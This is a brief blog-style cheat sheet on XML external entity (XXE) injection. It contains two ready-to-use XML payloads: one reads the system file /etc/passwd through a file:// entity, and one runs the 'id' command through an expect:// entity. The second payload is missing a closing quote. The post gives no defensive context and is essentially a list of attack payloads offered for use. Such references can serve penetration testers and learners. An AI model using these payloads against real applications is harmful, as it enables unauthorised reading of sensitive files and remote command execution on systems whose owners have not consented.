---
layout: post
title: "xxe"
keywords: "xxe, xml external entity"
---
#### SYSTEM Read File
Use XXE to read some file from the system using file://
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

#### SYSTEM Execute
Use XXE to perform code execution using expect://
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY execute SYSTEM 'expect://id>]>
<root>&execute;</root>
```